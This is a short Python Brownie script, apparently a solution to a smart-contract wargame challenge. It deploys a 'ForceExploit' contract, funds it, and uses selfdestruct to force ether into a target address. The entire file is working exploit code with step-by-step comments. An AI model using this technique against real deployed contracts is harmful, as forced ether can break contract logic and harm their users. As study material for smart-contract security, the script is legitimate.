from brownie import accounts, config, ForceExploit

def attack(exploit_contract, hacker, target):
    # First we do a transaction to our newly deployed contract
    print("Transfer to exploit contract")
    # Submit a transfer to our exploit contract
    hacker.transfer(to=exploit_contract.address, amount="0.00001 ether")
    # Destroy the contract using selfdestruct and sending the remaining funds to the given address
    exploit_contract.destroy(target, {'from': hacker})



def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    exploit_contract = ForceExploit.deploy({'from': hacker})

    attack(exploit_contract, hacker, target)
